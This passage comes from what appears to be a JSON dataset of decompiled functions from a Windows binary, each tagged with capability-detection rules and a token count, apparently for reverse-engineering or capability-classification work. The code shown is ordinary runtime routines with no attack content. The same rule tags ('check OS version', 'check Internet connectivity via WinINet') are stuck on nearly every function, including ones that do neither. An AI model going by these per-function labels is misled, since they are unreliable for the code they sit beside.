((*puVar1 & 0xc0) != 0x80) {\n                        return -1;\n                    }\n                    *(in_EAX + uVar3 * 2) = *puVar1 & 0x3f | uVar4 << 6;\n                }\n                uVar5 = uVar6;\n            }\n            if (in_EDX <= uVar3) {\n                uVar3 = in_EDX - 1;\n            }\n            *(in_EAX + uVar3 * 2) = 0;\n        }\n        var_10h = uVar3 + 1;\n    }\n    return var_10h;\n}\n",
        "token_count": 847
    },
    "00408600": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00408600(uint *arg_8h, uint *arg_ch)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    int32_t *in_EDX;\n    uint var_4h;\n    \n    iVar1 = sub.user32.dll_FindWindowA(0x4086b0, 0x40869c);\n    uVar2 = sub.user32.dll_RegisterWindowMessageA(0x4086b8);\n    *in_EAX = uVar2;\n    iVar3 = sub.user32.dll_RegisterWindowMessageA(0x4086c8);\n    *in_EDX = iVar3;\n    iVar3 = sub.user32.dll_RegisterWindowMessageA(0x4086e0);\n    *in_ECX = iVar3;\n    if ((*in_EDX == 0) || (iVar1 == 0)) {\n        *arg_ch = 0;\n    }\n    else {\n        uVar2 = sub.user32.dll_SendMessageA(iVar1, *in_EDX, 0, 0);\n        *arg_ch = uVar2;\n    }\n    if ((*in_ECX == 0) || (iVar1 == 0)) {\n        *arg_8h = 3;\n    }\n    else {\n        uVar2 = sub.user32.dll_SendMessageA(iVar1, *in_ECX, 0, 0);\n        *arg_8h = uVar2;\n    }\n    return iVar1;\n}\n",
        "token_count": 343
    },
    "004086f8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004086f8(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t iStack20;\n    int32_t iStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x408733;\n    iStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack16;\n    *0x495800 = *0x495800 + 1;\n    if ((*0x495800 == 0) && (*0x495804 != 0)) {\n        iStack20 = *0x495804;\n        sub.kernel32.dll_FreeLibrary_1();\n    }\n    *in_FS_OFFSET = iStack20;\n    return;\n}\n",
        "token_count": 169
    },
    "0040f6e4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0040f6e4(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t unaff_EBX;\n    uint32_t uVar3;\n    bool bVar4;\n    int32_t iStack24;\n    int32_t iStack20;\n    \n    uVar3 = CONCAT31(unaff_EBX >> 8, 1);\n    iVar1 = sub.kernel32.dll_GetCurrentThreadId_1();\n    if (iVar1 != *(in_EAX + 0x24)) {\n        fcn.0040f6a0();\n        iStack20 = *(in_EAX + 0x28);\n        fcn.0040f518();\n        bVar4 = *(iStack24 + 0xc) != 0;\n        if (bVar4) {\n            fcn.0040f47c();\n        }\n        while( true ) {\n            iVar2 = fcn.0040f49c();\n            if (iVar2 == 0xffff) break;\n            iVar2 = fcn.0040f49c();\n            if (iVar2 != 0) {\n                fcn.0040f6d4();\n            }\n        }\n        fcn.0040f6a0();\n        if (bVar4) {\n            fcn.0040f488();\n        }\n        *(in_EAX + 0x24) = iVar1;\n        iVar1 = fcn.0040f47c();\n        uVar3 = unaff_EBX & 0xffffff00 | iVar1 + -1 == iStack20;\n    }\n    *(in_EAX + 0x1c) = *(in_EAX + 0x1c) + 1;\n    return CONCAT44(iStack20, uVar3);\n}\n",
        "token_count": 393
    },
    "00409e54": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00409e54(void)\n\n{\n    uint uVar1;\n    int32_t iStack20;\n    \n    uVar1 = fcn.00403eb4();\n    if (iStack20 != 0) {\n        fcn.00409730();\n    }\n    return uVar1;\n}\n",
        "token_count": 68
    },
    "00409e90": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00409e90(int32_t param_1, uint param_2)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.00403eb4();\n    if (param_1 != 0) {\n        uVar1 = param_2;\n    }\n    return CONCAT44(param_1, uVar1);\n}\n",
        "token_count": 79
    },
    "00409ea8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00409ea8(int32_t param_1, uint32_t *param_2)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = fcn.00403eb4();\n    *param_2 = uVar1;\n    return CONCAT44(param_1, uVar1 & 0xffffff00 | param_1 == 0);\n}\n",
        "token_count": 84
    },
    "00409ec8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00409ec8(int32_t param_1, uint32_t *param_2)\n\n{\n    ulong uVar1;\n    \n    uVar1 = fcn.00406640();\n    *param_2 = uVar1;\n    param_2[1] = uVar1 >> 0x20;\n    return CONCAT44(param_1, uVar1 & 0xffffff00 | param_1 == 0);\n}\n",
        "token_count": 98
    },
    "0040a84c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0040a84c(void)\n\n{\n    ushort uVar1;\n    char *in_EAX;\n    ushort *puVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    \n    if (*in_EAX == '\\0') {\n        return 0;\n    }\n    puVar2 = in_EAX + 1 & 0xfffffffe;\n    while( true ) {\n        do {\n            uVar1 = *puVar2;\n            puVar2 = puVar2 + 1;\n            uVar3 = uVar1;\n            uVar4 = uVar1 >> 8;\n        } while ((uVar3 & uVar4) != 0);\n        if (uVar3 == 0) break;\n        if (uVar4 == 0) {\n            return -in_EAX + -1 + puVar2;\n        }\n    }\n    return -in_EAX + -2 + puVar2;\n}\n",
        "token_count": 211
    },
    "0040ab54": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040ab54(void)\n\n{\n    if (**0x492ab0 != NULL) {\n        (***0x492ab0)();\n        return;\n    }\n    fcn.00403040();\n    return;\n}\n",
        "token_count": 50
    },
    "0040ab84": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040ac53)\n\nvoid __cdecl fcn.0040ab84(uint noname_0, uint noname_1, int32_t arg_10h)\n\n{\n    char cVar1;\n    char cVar2;\n    char *in_EAX;\n    char *in_ECX;\n    char *pcVar3;\n    char *extraout_ECX;\n    char *extraout_ECX_00;\n    char *extraout_ECX_01;\n    char *pcVar4;\n    int32_t in_EDX;\n    char *extraout_EDX;\n    char *extraout_EDX_00;\n    char *pcVar5;\n    char *pcVar6;\n    char *pcVar7;\n    uint unaff_ESI;\n    char *pcVar8;\n    uint unaff_EDI;\n    bool bVar9;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar3 = in_ECX + arg_10h;\ncode_r0x0040abad:\n    pcVar4 = in_ECX;\n    if (in_EDX != 0) {\n        do {\n            if (pcVar4 == pcVar3) break;\n            pcVar5 = pcVar4 + 1;\n            cVar1 = *pcVar4;\n            pcVar7 = pcVar5;\n            if (cVar1 == '%') {\n                if (pcVar5 == pcVar3) break;\n                pcVar7 = pcVar4 + 2;\n                cVar1 = *pcVar5;\n                if (cVar1 != '%') goto code_r0x0040abd7;\n            }\n            *in_EAX = cVar1;\n            in_EDX = in_EDX + -1;\n            pcVar4 = pcVar7;\n            in_EAX = in_EAX + 1;\n            if (in_EDX == 0) break;\n        } while( true );\n    }\ncode_r0x0040aeeb:\n    fcn.0040aedb();\n    return;\ncode_r0x0040abd7:\n    in_ECX = pcVar7;\n    if (cVar1 == '-') {\n        if (pcVar7 == pcVar3) goto code_r0x0040aeeb;\n        in_ECX = pcVar7 + 1;\n    }\n    cVar2 = fcn.0040ac66(unaff_EDI, unaff_ESI);\n    pcVar3 = extraout_ECX;\n    if (cVar2 != ':') goto code_r0x0040abf6;\n    if (in_ECX == extraout_ECX) goto code_r0x0040aeeb;\n    pcVar7 = in_ECX + 1;\n    cVar1 = *in_ECX;\n    goto code_r0x0040abd7;\ncode_r0x0040abf6:\n    pcVar5 = extraout_EDX;\n    if (cVar2 == '.') {\n        if (in_ECX == extraout_ECX) goto code_r0x0040aeeb;\n        in_ECX = in_ECX + 1;\n        fcn.0040ac66(unaff_EDI, unaff_ESI);\n        pcVar3 = extraout_ECX_00;\n        pcVar5 = extraout_EDX_00;\n    }\n    fcn.0040acae(pcVar5, pcVar3);\n    pcVar7 = pcVar4 + -extraout_ECX_01;\n    if (pcVar4 < extraout_ECX_01) {\n        pcVar7 = NULL;\n    }\n    pcVar4 = extraout_ECX_01;\n    pcVar8 = in_ECX;\n    if (cVar1 == '-') {\n        bVar9 = pcVar5 < extraout_ECX_01;\n        pcVar5 = pcVar5 + -extraout_ECX_01;\n        if (bVar9) {\n            pcVar4 = extraout_ECX_01 + pcVar5;\n            pcVar5 = NULL;\n        }\n        for (; pcVar4 != NULL; pcVar4 = pcVar4 + -1) {\n            *in_EAX = *pcVar8;\n            pcVar8 = pcVar8 + 1;\n            in_EAX = in_EAX + 1;\n        }\n    }\n    pcVar6 = pcVar5 + -pcVar7;\n    if (pcVar5 < pcVar7) {\n        pcVar7 = pcVar7 + pcVar6;\n        pcVar6 = NULL;\n    }\n    for (; pcVar7 != NULL; pcVar7 = pcVar7 + -1) {\n        *in_EAX = ' ';\n        in_EAX = in_EAX + 1;\n    }\n    in_EDX = pcVar6 - pcVar4;\n    if (pcVar6 < pcVar4) {\n        pcVar4 = pcVar4 + in_EDX;\n        in_EDX = 0;\n    }\n    for (; pcVar4 != NULL; pcVar4 = pcVar4 + -1) {\n        *in_EAX = *pcVar8;\n        pcVar8 = pcVar8 + 1;\n        in_EAX = in_EAX + 1;\n    }\n    goto code_r0x0040abad;\n}\n",
        "token_count": 1192
    },
    "0040ac66": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ac66(uint arg_8h, uint arg_ch)\n\n{\n    uint8_t in_AL;\n    uint8_t *in_ECX;\n    int32_t unaff_EBP;\n    uint8_t *unaff_ESI;\n    uint var_ch;\n    uint var_8h;\n    \n    if (in_AL == 0x2a) {\n        if (*(unaff_EBP + -0xc) <= *(unaff_EBP + 8)) {\n            *(unaff_EBP + -0xc) = *(unaff_EBP + -0xc) + 1;\n        }\n        if (unaff_ESI == in_ECX) {\ncode_r0x0040aeeb:\n            fcn.0040aedb();\n            return;\n        }\n    }\n    else {\n        while ((0x2f < in_AL && (in_AL < 0x3a))) {\n            if (unaff_ESI == in_ECX) goto code_r0x0040aeeb;\n            in_AL = *unaff_ESI;\n            unaff_ESI = unaff_ESI + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 253
    },
    "0040b0b0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0040b0b0(uint arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    uchar *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    char in_CL;\n    int32_t extraout_ECX;\n    uint32_t uVar3;\n    uchar *puVar4;\n    uchar *puVar5;\n    uint var_2ch;\n    uint var_14h;\n    uint var_ch;\n    uint var_4h;\n    \n    iVar1 = 0x13;\n    if (in_CL == '\\0') {\n        iVar1 = arg_ch;\n        if (arg_ch < 2) {\n            iVar1 = 2;\n        }\n        if (0x12 < iVar1) {\n            iVar1 = 0x12;\n        }\n    }\n    uVar2 = 9999;\n    if (1 < arg_10h) {\n        uVar2 = arg_8h;\n    }\n    fcn.0040b384(uVar2, iVar1);\n    puVar5 = in_EAX;\n    if (var_2ch - 0x7fff < 2) {\n        fcn.0040b1af();\n        puVar4 = extraout_ECX * 3 + 0x40b1a0;\n        for (iVar1 = 3; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar5 = *puVar4;\n            puVar4 = puVar4 + 1;\n            puVar5 = puVar5 + 1;\n        }\n    }\n    else {\n        uVar3 = arg_10h;\n        if ((arg_10h != 1) && ((4 < arg_10h || (iVar1 < var_2ch)))) {\n            uVar3 = 0;\n        }\n        (**(uVar3 * 4 + 0x40b18c))();\n    }\n    return puVar5 - in_EAX;\n}\n",
        "token_count": 451
    },
    "0040b1af": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040b1af(void)\n\n{\n    int32_t unaff_EBP;\n    uchar *unaff_EDI;\n    uint var_2ah;\n    \n    if (*(unaff_EBP + -0x2a) != '\\0') {\n        *unaff_EDI = 0x2d;\n    }\n    return;\n}\n",
        "token_count": 76
    },
    "0040b384": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040b384(char param_1)\n\n{\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint var_4h;\n    \n    if (param_1 == '\\0') {\n        fcn.0040b3b1(unaff_EBX, unaff_ESI);\n    }\n    else {\n        fcn.0040b4d3(unaff_EBX);\n    }\n    return;\n}\n",
        "token_count": 96
    },
    "0040b3b1": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b3b1(uint arg_8h, uint arg_ch)\n\n{\n    char *pcVar1;\n    float10 fVar2;\n    int16_t *piVar3;\n    ushort uVar4;\n    uint32_t uVar5;\n    uint16_t uVar6;\n    uint8_t uVar8;\n    int32_t iVar7;\n    ushort *unaff_EBX;\n    int32_t unaff_EBP;\n    int32_t *unaff_ESI;\n    int16_t *piVar9;\n    float10 fVar10;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar6 = *(unaff_ESI + 2);\n    uVar5 = uVar6 & 0x7fff;\n    if ((uVar6 & 0x7fff) == 0) {\ncode_r0x0040b3dc:\n        uVar6 = 0;\n    }\n    else {\n        if (uVar5 != 0x7fff) {\n            *(unaff_EBP + -8) = ((uVar5 - 0x3fff) * 0x4d10 >> 0x10) + 1;\n            fVar10 = fcn.00404114();\n            fVar10 = ROUND(fVar10);\n            fVar2 = *(*(unaff_EBP + -4) + 0x490878);\n            *(unaff_EBP + -10) = (fVar2 < fVar10) << 8 | (fVar2 == fVar10) << 0xe;\n            if ((*(unaff_EBP + -10) & 0x4100) != 0) {\n                fVar10 = fVar10 / *(*(unaff_EBP + -4) + 0x490884);\n                *(unaff_EBP + -8) = *(unaff_EBP + -8) + 1;\n            }\n            *(unaff_EBP + -0x18) = fVar10;\n            iVar7 = 9;\n            piVar9 = unaff_EBX + 3;\n            do {\n                uVar8 = *(iVar7 + -0x19 + unaff_EBP);\n                piVar3 = piVar9 + 1;\n                *piVar9 = (CONCAT11(uVar8, uVar8 >> 4) & 0xfff) + 0x3030;\n                iVar7 = iVar7 + -1;\n                piVar9 = piVar3;\n            } while (iVar7 != 0);\n            *piVar3 = 0;\n            uVar5 = *(unaff_EBP + -8) + *(unaff_EBP + 8);\n            if (uVar5 < 0) {\n                uVar5 = 0;\n                goto code_r0x0040b3dc;\n            }\n            if (*(unaff_EBP + 0xc) <= uVar5) {\n                uVar5 = *(unaff_EBP + 0xc);\n            }\n            if (uVar5 < 0x12) {\n                if (*(unaff_EBX + uVar5 + 3) < 0x35) goto code_r0x0040b49e;\n                do {\n                    *(unaff_EBX + uVar5 + 3) = 0;\n                    if (uVar5 - 1 < 0) {\n                        *(unaff_EBX + 3) = 0x31;\n                        *(unaff_EBP + -8) = *(unaff_EBP + -8) + 1;\n                        break;\n                    }\n                    pcVar1 = unaff_EBX + uVar5 + 2;\n                    *pcVar1 = *pcVar1 + '\\x01';\n                    iVar7 = uVar5 + 2;\n                    uVar5 = uVar5 - 1;\n                } while (0x39 < *(unaff_EBX + iVar7));\n            }\n            else {\n                uVar5 = 0x12;\ncode_r0x0040b49e:\n                do {\n                    *(unaff_EBX + uVar5 + 3) = 0;\n                    if (uVar5 - 1 < 0) {\n                        uVar8 = 0;\n                        goto code_r0x0040b4b1;\n                    }\n                    iVar7 = uVar5 + 2;\n                    uVar5 = uVar5 - 1;\n                } while (*(unaff_EBX + iVar7) == '0');\n            }\n            uVar8 = *(unaff_ESI + 2) >> 8;\ncode_r0x0040b4b1:\n            uVar4 = *(unaff_EBP + -8);\n            goto code_r0x0040b4b4;\n        }\n        if (((*(unaff_ESI + 6) & 0x8000) != 0) && ((*unaff_ESI != 0 || (unaff_ESI[1] != -0x80000000)))) {\n            uVar5 = 0x8000;\n            goto code_r0x0040b3dc;\n        }\n    }\n    uVar8 = uVar6 >> 8;\n    uVar4 = uVar5;\n    *(unaff_EBX + 3) = 0;\ncode_r0x0040b4b4:\n    *unaff_EBX = uVar4;\n    *(unaff_EBX + 1) = uVar8 >> 7;\n    return;\n}\n",
        "token_count": 1192
    },
    "0040b5b0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040b5b0(uint param_1, float10 *param_2)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint8_t *in_EAX;\n    ushort extraout_var;\n    uint8_t *extraout_ECX;\n    uint8_t *extraout_ECX_00;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    int32_t extraout_EDX;\n    uint16_t in_FPUStatusWord;\n    uint16_t uVar5;\n    float10 fVar6;\n    uint16_t uVar7;\n    uint var_4h;\n    \n    uVar2 = *0x49580f;\n    uVar5 = (in_FPUStatusWord >> 8 & 0x7f) << 8;\n    fcn.0040b667();\n    uVar1 = *in_EAX;\n    uVar7 = uVar1;\n    if ((uVar1 == 0x2b) || (uVar1 == 0x2d)) {\n        in_EAX = in_EAX + 1;\n    }\n    fcn.0040b672();\n    iVar4 = 0;\n    puVar3 = extraout_ECX;\n    if (*in_EAX == uVar2) {\n        in_EAX = in_EAX + 1;\n        fcn.0040b672();\n        iVar4 = -extraout_EDX;\n        puVar3 = extraout_ECX_00;\n    }\n    if (puVar3 != in_EAX) {\n        if ((*in_EAX & 0xdf) == 0x45) {\n            in_EAX = in_EAX + 1;\n            fcn.0040b68e(iVar4);\n        }\n        fcn.0040b667();\n        if (*in_EAX == 0) {\n            fVar6 = fcn.00404114();\n            if (uVar7 >> 8 == '-') {\n                fVar6 = -fVar6;\n            }\n            if (uVar7 == '\\0') {\n                *param_2 = fVar6;\n            }\n            else {\n                *param_2 = ROUND(fVar6);\n            }\n            if ((uVar5 & 9) == 0) {\n                return CONCAT31(CONCAT22(extraout_var, uVar5) >> 8, 1);\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 534
    },
    "0040bda8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040bda8(int32_t arg_8h)\n\n{\n    if (*(arg_8h + -0x13) == '\\0') {\n        fcn.0040bbc4(*(*(arg_8h + 8) + 8), *(*(arg_8h + 8) + 0xc));\n        *(arg_8h + -0x13) = 1;\n    }\n    return;\n}\n",
        "token_count": 98
    },
    "0040bde0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040bde0(int32_t arg_8h)\n\n{\n    if (*(arg_8h + -0x1d) == '\\0') {\n        fcn.0040b8e4(arg_8h + -0x1c, *(*(arg_8h + 8) + 8), *(*(arg_8h + 8) + 0xc));\n        *(arg_8h + -0x1d) = 1;\n    }\n    return;\n}\n",
        "token_count": 113
    },
    "0040c0b4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040c0b4(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    bool bVar2;\n    uint8_t uVar3;\n    uint8_t *in_EAX;\n    uint8_t *puVar4;\n    int32_t iVar5;\n    uint8_t uVar6;\n    uint *in_FS_OFFSET;\n    uint uVar7;\n    uint uStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint var_2ch;\n    uint var_28h;\n    uint var_1eh;\n    int16_t var_1ah;\n    int16_t var_18h;\n    uint16_t var_16h;\n    uint var_13h;\n    int32_t var_ch;\n    uint8_t *var_4h;\n    \n    puStack64 = &stack0xfffffffc;\n    uStack68 = 0x40c838;\n    uStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    if ((in_EAX != NULL) && (*(arg_8h + -0x108) < 2)) {\n        *(arg_8h + -0x108) = *(arg_8h + -0x108) + 1;\n        var_1eh._0_1_ = 0x20;\n        var_4h = in_EAX;\n        while (*var_4h != 0) {\n            uVar1 = *var_4h;\n            if ((*((uVar1 >> 3) + 0x490820) >> (uVar1 & 7) & 1) == 0) {\n                var_4h = fcn.0040e6e4();\n                uVar6 = uVar1;\n                if (uVar1 + 0x9f < 0x1a) {\n                    uVar6 = uVar1 - 0x20;\n                }\n                uVar3 = var_1eh;\n                if (((uVar6 + 0xbf < 0x1a) && (uVar3 = uVar6,  uVar6 == 0x4d)) && (var_1eh == 0x48)) {\n                    uVar6 = 0x4e;\n                    uVar3 = uVar6;\n                }\n                var_1eh._0_1_ = uVar3;\n    // switch table (57 cases) at 0x40c1d5\n                switch(uVar6) {\n                case 0x22:\n                case 0x27:\n                    while ((*var_4h != 0 && (*var_4h != uVar1))) {\n                        if ((*((*var_4h >> 3) + 0x490820) >> (*var_4h & 7) & 1) == 0) {\n                            var_4h = var_4h + 1;\n                        }\n                        else {\n                            var_4h = fcn.0040e6e4();\n                        }\n                    }\n                    fcn.0040bcd0(arg_8h);\n                    if (*var_4h != 0) {\n                        var_4h = var_4h + 1;\n                    }\n                    break;\n                default:\n                    fcn.0040bcd0(arg_8h);\n                    break;\n                case 0x2f:\n                    if (*0x495811 != '\\0') {\n                        fcn.0040bcd0(arg_8h);\n                    }\n                    break;\n                case 0x3a:\n                    if (*0x49581c != '\\0') {\n                        fcn.0040bcd0(arg_8h);\n                    }\n                    break;\n                case 0x41:\n                    fcn.0040bde0(&stack0xfffffffc);\n                    iVar5 = fcn.0040a9e0();\n                    if (iVar5 == 0) {\n                        fcn.0040bcd0(arg_8h);\n                        var_4h = var_4h + 4;\n                    }\n                    else {\n                        iVar5 = fcn.0040a9e0();\n                        if (iVar5 == 0) {\n                            fcn.0040bcd0(arg_8h);\n                            var_4h = var_4h + 2;\n                        }\n                        else {\n                            iVar5 = fcn.0040a9e0();\n                            if (iVar5 == 0) {\n                                if (var_16h < 0xc) {\n                                    fcn.0040bd14(arg_8h);\n                                }\n                                else {\n                                    fcn.0040bd14(arg_8h);\n                                }\n                                var_4h = var_4h + 3;\n                            }\n                            else {\n                                iVar5 = fcn.0040a9e0();\n                                if (iVar5 == 0) {\n                                    fcn.0040bda8(&stack0xfffffffc);\n                                    uVar7 = *(arg_8h + 8);\n                                    fcn.0040bbe4(uVar7, *(arg_8h + 0xc));\n                                    fcn.0040bd14(uVar7);\n                                    var_4h = var_4h + 3;\n                                }\n                                else {\n                                    iVar5 = fcn.0040a9e0();\n                                    if (iVar5 == 0) {\n                                        fcn.0040bda8(&stack0xfffffffc);\n                                        uVar7 = *(arg_8h + 8);\n                                        fcn.0040bbe4(uVar7, *(arg_8h + 0xc));\n                                        fcn.0040bd14(uVar7);\n                                        var_4h = var_4h + 2;\n                                    }\n                                    else {\n                                        fcn.0040bcd0(arg_8h);\n                                    }\n                                }\n                            }\n                        }\n                    }\n                    break;\n                case 0x43:\n                    fcn.0040bd7c(&stack0xfffffffc);\n                    fcn.0040c0b4(arg_8h);\n                    fcn.0040bde0(&stack0xfffffffc);\n                    if (((var_16h != 0) || (var_18h != 0)) || (var_1ah != 0)) {\n                        fcn.0040bcd0(arg_8h);\n                        fcn.0040c0b4(arg_8h);\n                    }\n                    break;\n                case 0x44:\n                    fcn.0040bd7c(&stack0xfffffffc);\n                    if (var_ch - 1U < 2) {\n                        fcn.0040bda8(&stack0xfffffffc);\n                        fcn.0040bd30(arg_8h);\n                    }\n                    else if (var_ch == 3) {\n                        uVar7 = *(arg_8h + 8);\n                        fcn.0040bbe4(uVar7, *(arg_8h + 0xc));\n                        fcn.0040bd14(uVar7);\n                    }\n                    else if (var_ch == 4) {\n                        uVar7 = *(arg_8h + 8);\n                        fcn.0040bbe4(uVar7, *(arg_8h + 0xc));\n                        fcn.0040bd14(uVar7);\n                    }\n                    else if (var_ch == 5) {\n                        fcn.0040c0b4(arg_8h);\n                    }\n                    else {\n                        fcn.0040c0b4(arg_8h);\n                    }\n                    break;\n                case 0x45:\n                    fcn.0040bd7c(&stack0xfffffffc);\n                    fcn.0040bda8(&stack0xfffffffc);\n                    